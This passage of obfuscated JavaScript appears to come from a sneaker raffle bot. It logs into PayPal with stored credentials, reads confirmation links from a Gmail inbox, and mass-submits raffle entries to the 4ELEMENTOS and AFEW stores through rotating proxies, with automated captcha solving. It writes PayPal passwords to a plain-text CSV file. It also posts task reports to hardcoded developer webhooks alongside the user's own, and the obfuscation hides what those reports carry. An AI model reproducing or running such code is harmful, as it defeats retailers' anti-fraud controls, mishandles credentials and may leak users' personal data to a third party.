        let _0x3d788 = {}, _0x164205 = await _0x3f22ee['get']('Email');
        _0x3d788['Email'] = _0x164205['Email'];
        var _0x239fbd = Math['round'](Math['random']() * (_0x54a2d7['length'] - 0x1));
        _0x3d788['Proxy'] = _0x54a2d7[_0x239fbd], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x8858b = await _0x3f22ee['get']('Password');
        return _0x3d788['Password'] = _0x8858b['Password'], _0x51338a['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x3d788['Email'] + ',' + _0x3d788['Password'] + ',' + _0x3d788['Proxy']), _0x3d788;
    }
    let _0x487f2c = await _0x3e4bf1();
    var _0x16f2dc = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x370385 = await _0x3f22ee['get']('Amount'), _0x3b2ff0 = _0x370385['Amount'];
    async function _0x350b8d() {
        let _0x485fbf = 0x0;
        var _0x2f38f4 = new _0x3b7ac6({
            'user': _0x2c28ef['masterMail'],
            'password': _0x2c28ef['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x546e5a(_0x50cd16) {
            _0x2f38f4['openBox']('INBOX', ![], _0x50cd16);
        }
        _0x2f38f4['once']('ready', function () {
            _0x546e5a(function (_0x4616a1, _0x4cb703) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x4616a1)
                    throw _0x4616a1;
                _0x2f38f4['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x5e2a6d, _0x1dc59b) {
                    if (!_0x1dc59b || !_0x1dc59b['length'])
                        console['log'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20No\x20mails\x20found'), _0x2f38f4['end']();
                    else {
                        _0x1dc59b = _0x1dc59b['slice'](0x0, _0x3b2ff0);
                        var _0x1f7bcf = _0x2f38f4['seq']['fetch'](_0x1dc59b, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x1f7bcf['on']('message', function (_0x2ac2d7, _0x38f61c) {
                            var _0x5bd9fd = '(#' + _0x38f61c + ')\x20';
                            _0x2ac2d7['on']('body', function (_0x3c63a6, _0x242b32) {
                                _0x4bee6e(_0x3c63a6, (_0x2f16bd, _0x41faf6) => {
                                    if (_0x41faf6['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x41faf6['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x41faf6['text']['split']('[')[0x2];
                                        var _0x1fa74b = mes['split'](']')[0x0];
                                        _0x16f2dc['push'](_0x1fa74b);
                                    }
                                });
                            }), _0x2ac2d7['once']('end', function () {
                                _0x485fbf++;
                            });
                        }), _0x1f7bcf['once']('error', function (_0x5b17e3) {
                            console['log']('Fetch\x20error:\x20' + _0x5b17e3);
                        }), _0x1f7bcf['once']('end', function () {
                            _0x2f38f4['end']();
                        });
                    }
                });
            });
        }), _0x2f38f4['once']('error', function (_0x51b55b) {
            console['log'](_0x54c1f9['red'](_0x51b55b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2f38f4['once']('end', async function () {
        }), _0x2f38f4['connect']();
    }
    try {
        _0x350b8d(), await _0x468cfd(0xfa0), console['log']('Found\x20' + _0x16f2dc['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x468cfd(0xfa0);
    }
    var _0x3af91f;
    _0x48898b('' + _0x7ca6c6);
    var _0x29a11f = _0x487f2c['Proxy']['split'](':'), _0x5fc344;
    try {
        _0x5fc344 = await _0x2e0e40['launch']({
            'userDataDir': 'sessions/' + _0x487f2c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x29a11f[0x0] + ':' + _0x29a11f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x5fc344 = await _0x2e0e40['launch']({
            'userDataDir': 'sessions/' + _0x487f2c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x29a11f[0x0] + ':' + _0x29a11f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Getting\x20Session');
        const _0x5fa718 = await _0x5fc344['newPage']();
        await _0x5fa718['authenticate']({
            'username': '' + _0x29a11f[0x2],
            'password': '' + _0x29a11f[0x3]
        }), await _0x5fa718['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5fa718['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5fa718['waitForSelector']('#email');
            let _0x4de880 = await _0x5fa718['$eval']('#email', _0x51ba5d => _0x51ba5d['getAttribute']('value'));
            if (_0x4de880 == '') {
                await _0x5fa718['type']('#email', _0x487f2c['Email']), await _0x468cfd(0x1d3);
                let _0x30d9a0 = await _0x5fa718['$']('#splitPassword');
                _0x30d9a0 && (await _0x5fa718['click']('#btnNext'), await _0x468cfd(0xa28)), await _0x5fa718['type']('#password', _0x487f2c['Password']), await _0x468cfd(0x35c), await _0x5fa718['click']('#btnLogin');
            } else
                await _0x5fa718['type']('#password', _0x487f2c['Password']), await _0x468cfd(0x35c), await _0x5fa718['click']('#btnLogin');
            await _0x5fa718['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Successfully\x20logged\x20in'), await _0x468cfd(0x2710);
        } catch (_0x45251b) {
            throw new Error('Login\x20session\x20expired\x20' + _0x45251b);
        }
        for (var _0x3ffc50 = 0x0; _0x3ffc50 < _0x16f2dc['length']; _0x3ffc50++) {
            console['log'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Task\x20' + (_0x3ffc50 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x48898b(_0x7ca6c6 + '\x20Task\x20' + (_0x3ffc50 + 0x1) + '\x20/\x20' + _0x16f2dc['length']);
            const _0x59d541 = await _0x5fc344['newPage']();
            await _0x59d541['goto']('' + _0x16f2dc[_0x3ffc50], { 'waitUntil': 'networkidle2' }), await _0x468cfd(0xbb8);
            try {
                const _0x2583a5 = await _0x59d541['$']('#challenge-heading');
                _0x2583a5 && (console['log'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Task\x20' + (_0x3ffc50 + 0x1) + '\x20:\x20' + _0x54c1f9['yellow']('2FA\x20Required')), await _0x59d541['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x468cfd(0x9c40), await _0x59d541['waitForSelector']('#payment-submit-btn'), await _0x59d541['$eval']('#payment-submit-btn', _0x4f07f4 => _0x4f07f4['click']()), await _0x59d541['click']('#payment-submit-btn');
                try {
                    await _0x59d541['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x468cfd(0x5dc), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Task\x20' + (_0x3ffc50 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0xee92e) {
                    _0x29a24f = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0xee92e['message']);
                } finally {
                    if (_0x29a24f == 'yes' && _0x5c7e13 != 0x2) {
                        console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x7ca6c6['name'] + ']\x20Task\x20' + (_0x3ffc50 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c7e13 + '\x20/\x205)')), _0x3ffc50 = _0x3ffc50 - 0x1, _0x5c7e13 = _0x5c7e13 + 0x1;
                        continue;
                    }
                    _0x29a24f == 'yes' && _0x5c7e13 >= 0x2 && (_0x5cd42d(csv[_0x3ffc50], _0x7ca6c6), _0x29a24f = 'no', _0x5c7e13 = 0x0), await _0x59d541['close'](), await _0x468cfd(0x4650);
                }
            } catch (_0x4a3561) {
                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x7ca6c6 + ']\x20Task\x20' + (_0x3ffc50 + 0x1) + '\x20:\x20' + _0x4a3561));
            }
        }
    } catch (_0x4d43e7) {
        console['log'](_0x54c1f9['red']('' + _0x4d43e7));
    } finally {
        await _0x5fc344['close']();
    }
}
const _0x2f4215 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x344fff, _0x2d2bf1, _0x5af427) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x34ff87 = 0x0; _0x34ff87 < _0x2d2bf1['length']; _0x34ff87++) {
                        if (_0x442d68 != 'yes')
                            var _0x442d68 = '', _0x4c992a = 0x0;
                        var _0x350295;
                        try {
                            await _0x16822f(_0x2d2bf1, _0x34ff87);
                        } catch {
                            _0x442d68 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x48898b(_0x344fff['name'] + '\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20/\x20' + _0x2d2bf1['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        var _0x345cba = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x1dd5d1 = Math['round'](Math['random']() * (_0x345cba['length'] - 0x1));
                        _0x2d2bf1[_0x34ff87]['Size'] == 'RANDOM' && (_0x2d2bf1[_0x34ff87]['Size'] = _0x345cba[_0x1dd5d1]);
                        var _0x5b7a7c = Math['round'](Math['random']() * (_0x5af427['length'] - 0x1)), _0x1d3451 = _0x5af427[_0x5b7a7c]['split'](':'), _0x32390f;
                        try {
                            _0x32390f = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d3451[0x0] + ':' + _0x1d3451[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x32390f = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d3451[0x0] + ':' + _0x1d3451[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x224926 = await _0x32390f['newPage']();
                            await _0x224926['authenticate']({
                                'username': '' + _0x1d3451[0x2],
                                'password': '' + _0x1d3451[0x3]
                            }), await _0x224926['setRequestInterception'](!![]), _0x224926['on']('request', _0x431768 => {
                                _0x431768['resourceType']() === 'image' || _0x431768['resourceType']() === 'font' || _0x431768['resourceType']() === 'media' ? _0x431768['abort']() : _0x431768['continue']();
                            }), await _0x224926['goto'](_0x2d2bf1[_0x34ff87]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x224926['waitForSelector']('#accept-all-gdpr'), await _0x224926['click']('#accept-all-gdpr'), await _0x224926['waitForSelector']('#raffles-product'), await _0x468cfd(0x3e8), await _0x224926['$eval']('#raffles-product', _0xb6ef6b => _0xb6ef6b['click']()), await _0x468cfd(0x1388), await _0x224926['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x456ea1 = await _0x224926['$']('.fancybox-inner\x20>\x20iframe'), _0x123cfd = await _0x456ea1['contentFrame']();
                            console['log'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x123cfd['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x468cfd(0x1f4), await _0x123cfd['type']('input[name=\x22sm-form-email\x22]', _0x2d2bf1[_0x34ff87]['Email']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-name\x22]', _0x2d2bf1[_0x34ff87]['FirstName'] + '\x20' + _0x2d2bf1[_0x34ff87]['LastName']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-street\x22]', _0x2d2bf1[_0x34ff87]['Address1'] + '\x20' + _0x2d2bf1[_0x34ff87]['HouseNumber'] + '\x20' + _0x2d2bf1[_0x34ff87]['Address2']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-city\x22]', _0x2d2bf1[_0x34ff87]['City']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-province\x22]', _0x2d2bf1[_0x34ff87]['State']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-zip\x22]', _0x2d2bf1[_0x34ff87]['Zip']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-country\x22]', _0x2d2bf1[_0x34ff87]['Country']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-form-phone\x22]', _0x2d2bf1[_0x34ff87]['Phone']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x2d2bf1[_0x34ff87]['Follower']), await _0x468cfd(0xc8), await _0x123cfd['type']('input[name=\x22sm-cst.size\x22]', _0x2d2bf1[_0x34ff87]['Size']), await _0x468cfd(0x1f4), await _0x123cfd['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x468cfd(0x1f4), await _0x123cfd['click']('.icheckbox_simple-custom'), await _0x468cfd(0x1f4), console['log'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x123cfd['$eval']('form', _0x1ecf37 => _0x1ecf37['submit']()), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x442d68 = '';
                            var _0x3b96ef = await _0x436de5(_0x2d2bf1[_0x34ff87], _0x344fff, 'dev', ![]), _0x3a2754 = await _0x436de5(_0x2d2bf1[_0x34ff87], _0x344fff, 'pub', ![]);
                            const _0x583d90 = {
                                'succesDEVMSG': { 'embeds': [_0x3b96ef] },
                                'succesPUBMSG': { 'embeds': [_0x3a2754] }
                            };
                            try {
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x583d90['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x583d90['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0x583d90['succesPUBMSG']);
                            } catch (_0x1bd35b) {
                                console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1bd35b));
                            }
                        } catch (_0x4fca37) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20' + _0x4fca37)), _0x350295 = '' + _0x4fca37;
                            var _0x3bbe53 = await _0x436de5(_0x2d2bf1[_0x34ff87], _0x344fff, 'dev', !![], _0x350295), _0x3b96ef = await _0x436de5(_0x2d2bf1[_0x34ff87], _0x344fff, 'dev', ![]), _0x3a2754 = await _0x436de5(_0x2d2bf1[_0x34ff87], _0x344fff, 'pub', ![]);
                            const _0xfb4385 = {
                                'succesDEVMSG': { 'embeds': [_0x3b96ef] },
                                'succesPUBMSG': { 'embeds': [_0x3a2754] }
                            };
                            _0xfb4385['errorDEV'] = { 'embeds': [_0x3bbe53] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0xfb4385['errorDEV']), await _0x4feadc(_0x408671, _0xfb4385['errorDEV']), _0x4fca37 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x442d68 = 'yes');
                        } finally {
                            _0x32390f['close']();
                            if (_0x442d68 == 'yes' && _0x4c992a != 0x5 && _0x350295 != 'Size\x20Not\x20Found') {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Task\x20' + (_0x34ff87 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4c992a + '\x20/\x205)\x20')), _0x34ff87 = _0x34ff87 - 0x1, _0x4c992a = _0x4c992a + 0x1;
                                continue;
                            }
                            _0x442d68 == 'yes' && _0x4c992a >= 0x5 && (_0x5cd42d(_0x2d2bf1[_0x34ff87], _0x344fff), _0x442d68 = 'no', _0x4c992a = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0x344fff['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x5830bd, _0x13875c) {
                    var _0x5f41fe = [];
                    async function _0x2bd8da() {
                        var _0x563766 = new _0x3b7ac6({
                            'user': _0x2c28ef['masterMail'],
                            'password': _0x2c28ef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x448c5a(_0x178489) {
                            _0x563766['openBox']('INBOX', ![], _0x178489);
                        }
                        _0x563766['once']('ready', function () {
                            _0x448c5a(function (_0x410dcb, _0x36cfb5) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x410dcb)
                                    throw _0x410dcb;
                                _0x563766['seq']['search'](['UNSEEN'], function (_0x4471a9, _0x4c0c15) {
                                    if (!_0x4c0c15 || !_0x4c0c15['length'])
                                        console['log'](_0x2e90f3() + '\x20[' + _0x5830bd['name'] + ']\x20No\x20mails\x20found'), _0x563766['end']();
                                    else {
                                        var _0x303931 = _0x563766['seq']['fetch'](_0x4c0c15, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x303931['on']('message', function (_0xecaeab, _0x1342dc) {
                                            var _0x5b4bfc = '(#' + _0x1342dc + ')\x20';
                                            _0xecaeab['on']('body', function (_0x59e4fc, _0x27d73d) {
                                                _0x4bee6e(_0x59e4fc, (_0x532496, _0x4506a1) => {
                                                    if (_0x4506a1['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x341dec = _0x4506a1['html']['split']('\x0a');
                                                        for (var _0x4ba913 = 0x0; _0x4ba913 < _0x341dec['length']; _0x4ba913++) {
                                                            if (_0x341dec[_0x4ba913]['includes']('salesmanago') && _0x341dec[_0x4ba913]['includes']('<td') && _0x341dec[_0x4ba913]['includes']('href')) {
                                                                var _0x15b9fe = _0x341dec[_0x4ba913]['split']('href=\x22'), _0x4eeaea = _0x15b9fe[0x1]['split']('\x22')[0x0];
                                                                _0x5f41fe['push'](_0x4eeaea);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0xecaeab['once']('end', function () {
                                            });
                                        }), _0x303931['once']('error', function (_0x560f9b) {
                                            console['log']('Fetch\x20error:\x20' + _0x560f9b);
                                        }), _0x303931['once']('end', function () {
                                            _0x563766['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x563766['once']('error', function (_0x312729) {
                            console['log'](_0x54c1f9['red'](_0x312729['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x563766['once']('end', async function () {
                        }), _0x563766['connect']();
                    }
                    async function _0x51416e(_0x39a41b, _0x37a369, _0x20f29d) {
                        for (var _0x351f67 = 0x0; _0x351f67 < _0x37a369['length']; _0x351f67++) {
                            async function _0x2cf725(_0x76872a, _0xaa14b, _0x5c7985, _0x2c3d80, _0x584080) {
                                var _0x2df4ea, _0x339340 = {}, _0x3563cf = [], _0x4e5ace = {}, _0x3dd0d5 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2385c3 = Math['round'](Math['random']() * (_0x3dd0d5['length'] - 0x1));
                                _0x2c3d80[_0x76872a]['Size'] == 'RANDOM' && (_0x2c3d80[_0x76872a]['Size'] = _0x3dd0d5[_0x2385c3]);
                                !_0x2c3d80 && (_0x2c3d80 = {});
                                if (_0x2c28ef['useRandomProxy'] = ![])
                                    var _0x5d4a90 = _0x584080[_0x76872a]['split'](':');
                                else
                                    var _0x9b3439 = Math['round'](Math['random']() * (_0x584080['length'] - 0x1)), _0x5d4a90 = _0x584080[_0x9b3439]['split'](':');
                                var _0x2f3fc7 = {
                                    'jar': _0x15a445,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5c7985['url'],
                                    'headers': _0x5c7985['headers'],
                                    'body': JSON['stringify'](_0x339340),
                                    'proxy': 'http://' + _0x5d4a90[0x2] + ':' + _0x5d4a90[0x3] + '@' + _0x5d4a90[0x0] + ':' + _0x5d4a90[0x1]
                                };
                                return _0xaa14b != 'ver' && (_0x2f3fc7['url'] = _0x5c7985['url'], _0x2f3fc7['headers'] = _0x5c7985['headers']), _0xaa14b == 'ver' && (_0x2f3fc7['method'] = 'GET', _0x2f3fc7['url'] = _0x2c3d80[_0x76872a]), new Promise(function (_0x675e18, _0x2d19e3) {
                                    callback = async (_0xd15952, _0x524443, _0x4649ec) => {
                                        if (!_0xd15952 && _0x524443['statusCode'] == 0xca || !_0xd15952 && _0x524443['statusCode'] == 0xc8) {
                                            if (_0xaa14b != 'ver') {
                                                var _0x5423a1 = await _0x436de5(_0x2c3d80[_0x76872a], _0x5c7985, 'dev', ![]), _0x221070 = await _0x436de5(_0x2c3d80[_0x76872a], _0x5c7985, 'pub', ![]);
                                                const _0xad74ca = {
                                                    'succesDEVMSG': { 'embeds': [_0x5423a1] },
                                                    'succesPUBMSG': { 'embeds': [_0x221070] }
                                                };
                                                if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                                    try {
                                                        await _0x4feadc(_0x2c28ef['webhook'], _0xad74ca['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0xad74ca['succesDEVMSG']), await _0x468cfd(0xc8);
                                                try {
                                                    await _0x4feadc(_0x578906, _0xad74ca['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x504d25(_0x2c3d80[_0x76872a], _0x5c7985);
                                            }
                                            _0x675e18(console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x5c7985['name'] + ']\x20Task\x20' + (_0x76872a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xaa14b != 'ver') {
                                                var _0x4a24ff = '' + _0xd15952, _0x71b535 = await _0x436de5(_0x2c3d80[_0x76872a], _0x5c7985, 'dev', !![], _0x4a24ff), _0x23c13f = {};
                                                _0x23c13f['errorDEV'] = { 'embeds': [_0x71b535] }, _0x5cd42d(_0x2c3d80[_0x76872a], _0x5c7985), _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x23c13f['errorDEV']), await _0x4feadc(_0x408671, _0x23c13f['errorDEV']);
                                            }
                                            _0x2d19e3(console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5c7985['name'] + ']\x20Task\x20' + (_0x76872a + 0x1) + ':\x20' + _0xd15952)));
                                        }
                                    };
                                    try {
                                        _0xaa14b != 'ver' ? console['log'](_0x2e90f3() + '\x20[' + _0x5c7985['name'] + ']\x20Task\x20' + (_0x76872a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x339340['data']['attributes']['email']) : console['log'](_0x2e90f3() + '\x20[' + _0x5c7985['name'] + ']\x20Task\x20' + (_0x76872a + 0x1) + ':\x20Fetching\x20Response'), _0x59e135(_0x2f3fc7, callback);
                                    } catch (_0x423165) {
                                        console['log'](_0x2e90f3() + '\x20Task\x20' + (_0x76872a + 0x1) + ':\x20' + _0x423165);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2cf725(_0x351f67, 'ver', _0x39a41b, _0x37a369, _0x20f29d), console['log'](_0x2e90f3() + '\x20[' + _0x39a41b['name'] + ']\x20Sleeping\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                            } catch (_0x5487f5) {
                            }
                        }
                    }
                    try {
                        _0x2bd8da(), await _0x468cfd(0xfa0), console['log']('Found\x20' + _0x5f41fe['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x51416e(_0x5830bd, _0x5f41fe, _0x13875c);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x59142d, _0x2bd270, _0x49472f) {
                for (var _0x3f0c24 = 0x0; _0x3f0c24 < _0x2bd270['length']; _0x3f0c24++) {
                    _0x2c28ef['AfewDelay'] = _0x2c28ef['delay'];
                    var _0xb276b1;
                    if (_0x441933 != 'yes')
                        var _0x441933 = '', _0x5176c4 = 0x0;
                    var _0x20e3f6 = _0x2bd270[_0x3f0c24]['Url'], _0x248f0c = _0x2bd270[_0x3f0c24];
                    _0x48898b(_0x59142d['name'] + '\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20/\x20' + _0x2bd270['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                    try {
                        await _0x16822f(_0x2bd270, _0x3f0c24);
                    } catch {
                        _0x441933 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xce7fde(_0x25e319) {
                        const _0x3dcb54 = _0x51338a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2ff43a = _0x2300d9['parse'](_0x3dcb54, { 'header': !![] })['data'];
                        let _0x23ef11 = ![];
                        for (var _0x348fdd of _0x2ff43a) {
                            if (_0x348fdd['Url'] == _0x25e319['Url'] && _0x348fdd['Email'] == _0x25e319['Email']) {
                                _0x23ef11 = !![];
                                break;
                            }
                        }
                        return _0x23ef11;
                    }
                    if (await _0xce7fde(_0x2bd270[_0x3f0c24]) == !![]) {
                        console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4d5fb0 = await _0x436de5(_0x2bd270[_0x3f0c24], _0x59142d, 'dev', ![]), _0xfb6481 = await _0x436de5(_0x2bd270[_0x3f0c24], _0x59142d, 'pub', ![]);
                    const _0x34b3a3 = {
                        'succesDEVMSG': { 'embeds': [_0x4d5fb0] },
                        'succesPUBMSG': { 'embeds': [_0xfb6481] }
                    };
                    if (_0x2bd270[_0x3f0c24]['Email'] == '' || _0x2bd270[_0x3f0c24]['FirstName'] == '' || _0x2bd270[_0x3f0c24]['LastName'] == '' || _0x2bd270[_0x3f0c24]['Country'] == '' || _0x2bd270[_0x3f0c24]['Size'] == '' || _0x2bd270[_0x3f0c24]['Address1'] == '' || _0x2bd270[_0x3f0c24]['Zip'] == '') {
                        console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2c28ef['useRandomProxy'] = ![])
                        var _0x33cb67 = _0x49472f[_0x3f0c24]['split'](':');
                    else
                        var _0x520744 = Math['round'](Math['random']() * (_0x49472f['length'] - 0x1)), _0x33cb67 = _0x49472f[_0x520744]['split'](':');
                    var _0x22f662;
                    try {
                        _0x22f662 = await _0x2e0e40['launch']({
